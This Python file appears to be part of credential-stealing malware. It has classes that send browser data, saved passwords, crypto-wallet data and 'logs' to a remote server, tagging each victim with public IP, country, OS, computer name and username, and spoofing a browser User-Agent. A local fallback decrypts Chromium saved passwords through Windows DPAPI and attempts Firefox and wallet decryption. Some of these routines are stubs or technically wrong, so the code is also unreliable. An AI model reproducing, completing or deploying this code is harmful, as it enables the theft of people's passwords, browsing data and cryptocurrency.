import os
import json
import base64
import requests
import threading
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import win32crypt

class ServerSideDecryption:
    def __init__(self, server_url, encryption_key=None):
        self.server_url = server_url
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        })
        
    def encrypt_data(self, data):
        """Encrypt data before sending to server"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            
            encrypted_data = self.cipher_suite.encrypt(data.encode())
            return base64.b64encode(encrypted_data).decode()
        except Exception as e:
            print(f"Encryption error: {e}")
            return None
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data received from server"""
        try:
            encrypted_bytes = base64.b64decode(encrypted_data.encode())
            decrypted_data = self.cipher_suite.decrypt(encrypted_bytes)
            return json.loads(decrypted_data.decode())
        except Exception as e:
            print(f"Decryption error: {e}")
            return None
    
    def send_encrypted_data(self, endpoint, data):
        """Send encrypted data to server"""
        try:
            encrypted_data = self.encrypt_data(data)
            if not encrypted_data:
                return None
            
            payload = {
                'encrypted_data': encrypted_data,
                'timestamp': time.time(),
                'client_id': self.get_client_id()
            }
            
            response = self.session.post(
                f"{self.server_url}/{endpoint}",
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Server error: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"Send error: {e}")
            return None
    
    def get_client_id(self):
        """Generate unique client ID"""
        try:
            import uuid
            import hashlib
            
            # Get system info for unique ID
            system_info = {
                'computer_name': os.environ.get('COMPUTERNAME', ''),
                'username': os.environ.get('USERNAME', ''),
                'processor_arch': os.environ.get('PROCESSOR_ARCHITECTURE', '')
            }
            
            system_string = json.dumps(system_info, sort_keys=True)
            return hashlib.md5(system_string.encode()).hexdigest()
        except Exception:
            return str(int(time.time()))
    
    def decrypt_browser_data(self, encrypted_browser_data):
        """Decrypt browser data on server side"""
        try:
            payload = {
                'data_type': 'browser_data',
                'encrypted_data': encrypted_browser_data
            }
            
            response = self.send_encrypted_data('decrypt/browser', payload)
            if response and 'decrypted_data' in response:
                return self.decrypt_data(response['decrypted_data'])
            return None
            
        except Exception as e:
            print(f"Browser decryption error: {e}")
            return None
    
    def decrypt_wallet_data(self, encrypted_wallet_data):
        """Decrypt wallet data on server side"""
        try:
            payload = {
                'data_type': 'wallet_data',
                'encrypted_data': encrypted_wallet_data
            }
            
            response = self.send_encrypted_data('decrypt/wallet', payload)
            if response and 'decrypted_data' in response:
                return self.decrypt_data(response['decrypted_data'])
            return None
            
        except Exception as e:
            print(f"Wallet decryption error: {e}")
            return None
    
    def decrypt_password_data(self, encrypted_password_data):
        """Decrypt password data on server side"""
        try:
            payload = {
                'data_type': 'password_data',
                'encrypted_data': encrypted_password_data
            }
            
            response = self.send_encrypted_data('decrypt/password', payload)
            if response and 'decrypted_data' in response:
                return self.decrypt_data(response['decrypted_data'])
            return None
            
        except Exception as e:
            print(f"Password decryption error: {e}")
            return None
    
    def decrypt_application_data(self, encrypted_app_data):
        """Decrypt application data on server side"""
        try:
            payload = {
                'data_type': 'application_data',
                'encrypted_data': encrypted_app_data
            }
            
            response = self.send_encrypted_data('decrypt/application', payload)
            if response and 'decrypted_data' in response:
                return self.decrypt_data(response['decrypted_data'])
            return None
            
        except Exception as e:
            print(f"Application decryption error: {e}")
            return None
    
    def send_log_data(self, log_data):
        """Send log data to server for processing"""
        try:
            encrypted_log = self.encrypt_data(log_data)
            if not encrypted_log:
                return False
            
            payload = {
                'log_data': encrypted_log,
                'client_info': {
                    'ip': self.get_public_ip(),
                    'country': self.get_country(),
                    'os': self.get_os_info(),
                    'timestamp': time.time()
                }
            }
            
            response = self.send_encrypted_data('logs/save', payload)
            return response is not None
            
        except Exception as e:
            print(f"Log send error: {e}")
            return False
    
    def get_public_ip(self):
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text.strip()
        except Exception:
            return 'Unknown'
    
    def get_country(self):
        """Get country from IP"""
        try:
            response = requests.get('https://ipapi.co/json/', timeout=5)
            data = response.json()
            return data.get('country_name', 'Unknown')
        except Exception:
            return 'Unknown'
    
    def get_os_info(self):
        """Get OS information"""
        try:
            import platform
            return f"{platform.system()} {platform.release()}"
        except Exception:
            return 'Unknown'
    
    def batch_decrypt(self, encrypted_items):
        """Decrypt multiple items in batch"""
        try:
            payload = {
                'items': encrypted_items,
                'batch_size': len(encrypted_items)
            }
            
            response = self.send_encrypted_data('decrypt/batch', payload)
            if response and 'decrypted_items' in response:
                return self.decrypt_data(response['decrypted_items'])
            return None
            
        except Exception as e:
            print(f"Batch decryption error: {e}")
            return None
    
    def health_check(self):
        """Check server health"""
        try:
            response = self.session.get(f"{self.server_url}/health", timeout=10)
            return response.status_code == 200
        except Exception:
            return False

class LocalDecryptionFallback:
    """Fallback for local decryption when server is unavailable"""
    
    def __init__(self):
        self.local_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.local_key)
    
    def decrypt_chromium_password(self, encrypted_password):
        """Decrypt Chromium password locally"""
        try:
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                # Windows DPAPI decryption
                return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            else:
                # Legacy decryption
                return encrypted_password.decode()
        except Exception:
            return None
    
    def decrypt_firefox_password(self, encrypted_password, master_password=None):
        """Decrypt Firefox password locally"""
        try:
            # Firefox uses NSS for encryption
            # This is a simplified version - real implementation would use NSS
            if master_password:
                # Use master password for decryption
                return self._decrypt_with_master_password(encrypted_password, master_password)
            else:
                # Try default decryption
                return encrypted_password.decode('utf-8', errors='ignore')
        except Exception:
            return None
    
    def _decrypt_with_master_password(self, encrypted_data, master_password):
        """Decrypt with master password"""
        try:
            # Simplified master password decryption
            # Real implementation would use proper NSS functions
            return encrypted_data.decode('utf-8', errors='ignore')
        except Exception:
            return None
    
    def decrypt_wallet_file(self, wallet_data, password=None):
        """Decrypt wallet file locally"""
        try:
            if password:
                # Use provided password
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=b'salt',  # In real implementation, use proper salt
                    iterations=100000,
                )
                key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
                cipher_suite = Fernet(key)
                return cipher_suite.decrypt(wallet_data)
            else:
                # Try common passwords or patterns
                return wallet_data.decode('utf-8', errors='ignore')
        except Exception:
            return None

class HybridDecryptionManager:
    """Manages both server-side and local decryption"""
    
    def __init__(self, server_url=None):
        self.server_decryption = ServerSideDecryption(server_url) if server_url else None
        self.local_decryption = LocalDecryptionFallback()
        self.use_server = server_url is not None
    
    def decrypt_data(self, data_type, encrypted_data, **kwargs):
        """Decrypt data using server or local fallback"""
        try:
            if self.use_server and self.server_decryption.health_check():
                # Use server-side decryption
                if data_type == 'browser':
                    return self.server_decryption.decrypt_browser_data(encrypted_data)
                elif data_type == 'wallet':
                    return self.server_decryption.decrypt_wallet_data(encrypted_data)
                elif data_type == 'password':
                    return self.server_decryption.decrypt_password_data(encrypted_data)
                elif data_type == 'application':
                    return self.server_decryption.decrypt_application_data(encrypted_data)
            else:
                # Use local decryption fallback
                if data_type == 'chromium_password':
                    return self.local_decryption.decrypt_chromium_password(encrypted_data)
                elif data_type == 'firefox_password':
                    return self.local_decryption.decrypt_firefox_password(encrypted_data, kwargs.get('master_password'))
                elif data_type == 'wallet_file':
                    return self.local_decryption.decrypt_wallet_file(encrypted_data, kwargs.get('password'))
            
            return None
            
        except Exception as e:
            print(f"Decryption error: {e}")
            return None
    
    def send_log(self, log_data):
        """Send log data to server"""
        if self.use_server and self.server_decryption:
            return self.server_decryption.send_log_data(log_data)
        return False
